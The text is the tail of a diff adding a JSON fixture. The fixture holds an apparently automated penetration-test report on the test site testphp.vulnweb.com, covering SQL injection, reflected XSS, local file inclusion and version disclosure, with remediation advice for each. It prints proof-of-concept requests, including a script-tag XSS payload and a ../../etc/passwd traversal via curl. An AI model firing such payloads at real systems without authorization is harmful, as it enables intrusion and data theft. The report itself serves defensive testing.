Used:**\n```\nStandard SQLMap payloads for MySQL detection\n```\n\n**Evidence (Response excerpt):**\n```\nGET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable\nGET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable\nGET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable\nGET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\ntarget URL appears to have 11 columns in query\n```\n\n### Impact\nComplete database compromise including ability to extract sensitive data, modify database contents, and potentially execute operating system commands depending on database privileges.\n\n### Remediation\nImplement parameterized queries/prepared statements for all database interactions. Validate and sanitize all user input before database queries.\n\n---\n## [HIGH] Reflected Cross-Site Scripting (XSS) in search.php\n\n| Field | Value |\n|-------|-------|\n| Severity | High |\n| CVSS | 7.5 |\n| CWE | CWE-79 |\n| Location | http://testphp.vulnweb.com/search.php?test= |\n\n### Description\nThe search functionality reflects user input directly into MySQL error messages without proper sanitization, creating a reflected XSS vulnerability.\n\n### Proof of Concept\n\n**Vulnerable Request:**\n```\ncurl \"http://testphp.vulnweb.com/search.php?test=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E\"\n```\n\n**Payload Used:**\n```\n<script>alert('XSS')</script>\n```\n\n**Evidence (Response excerpt):**\n```\nError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'XSS')</script>'' at line 1\n```\n\n### Impact\nAttackers can execute arbitrary JavaScript in victim browsers, leading to session hijacking, credential theft, and malicious actions on behalf of users.\n\n### Remediation\nImplement proper output encoding/escaping for all user-controlled data. Use Content Security Policy (CSP) headers to mitigate XSS attacks.\n\n---\n## [HIGH] Local File Inclusion in showimage.php\n\n| Field | Value |\n|-------|-------|\n| Severity | High |\n| CVSS | 7.5 |\n| CWE | CWE-22 |\n| Location | http://testphp.vulnweb.com/showimage.php?file= |\n\n### Description\nThe showimage.php script is vulnerable to local file inclusion through the `file` parameter, though protected by open_basedir restrictions.\n\n### Proof of Concept\n\n**Vulnerable Request:**\n```\ncurl \"http://testphp.vulnweb.com/showimage.php?file=../../../../../etc/passwd\"\n```\n\n**Payload Used:**\n```\n../../../../../etc/passwd\n```\n\n**Evidence (Response excerpt):**\n```\nWarning: fopen(): open_basedir restriction in effect. File(../../../../../etc/passwd) is not within the allowed path(s): (/hj/:/tmp/:/proc/) in /hj/var/www/showimage.php on line 13\n\nWarning: fopen(../../../../../etc/passwd): failed to open stream: Operation not permitted in /hj/var/www/showimage.php on line 13\n```\n\n### Impact\nWhile currently mitigated by open_basedir restrictions, this vulnerability could allow attackers to read sensitive files if restrictions are bypassed or misconfigured.\n\n### Remediation\nImplement a whitelist of allowed files instead of accepting user input for file paths. Validate file paths against allowed directories and use basename() to prevent directory traversal.\n\n---\n## [MEDIUM] Information Disclosure - Server Version\n\n| Field | Value |\n|-------|-------|\n| Severity | Medium |\n| CVSS | 5.0 |\n| CWE | CWE-200 |\n| Location | http://testphp.vulnweb.com/ |\n\n### Description\nThe server reveals detailed version information in HTTP headers and error pages.\n\n### Proof of Concept\n\n**Vulnerable Request:**\n```\ncurl -I \"http://testphp.vulnweb.com/\"\n```\n\n**Evidence (Response excerpt):**\n```\nServer: nginx/1.19.0\nX-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1\n```\n\n### Impact\nVersion information aids attackers in identifying specific vulnerabilities and attack vectors for the disclosed software versions.\n\n### Remediation\nConfigure web server and PHP to suppress version information in headers and error pages.\n\n# Summary Table\n\n| # | Vulnerability | Severity | Location |\n|---|--------------|----------|----------|\n| 1 | SQL Injection | Critical | /listproducts.php?cat= |\n| 2 | Reflected XSS | High | /search.php?test= |\n| 3 | Local File Inclusion | High | /showimage.php?file= |\n| 4 | Information Disclosure | Medium | Server headers |\n\n# Recommendations\n\n1. **Immediate Priority**: Fix SQL injection vulnerability in listproducts.php by implementing parameterized queries\n2. **High Priority**: Implement proper input validation and output encoding to prevent XSS attacks\n3. **High Priority**: Restrict file access in showimage.php using whitelisting approach\n4. **Medium Priority**: Configure server to suppress version information disclosure\n5. **General**: Implement a comprehensive security code review and testing process for all user input handling",
+        "scan_data": {
+            "targets": [
+                "http://testphp.vulnweb.com/"
+            ],
+            "tools_executed": 36
+        }
+    }
+}
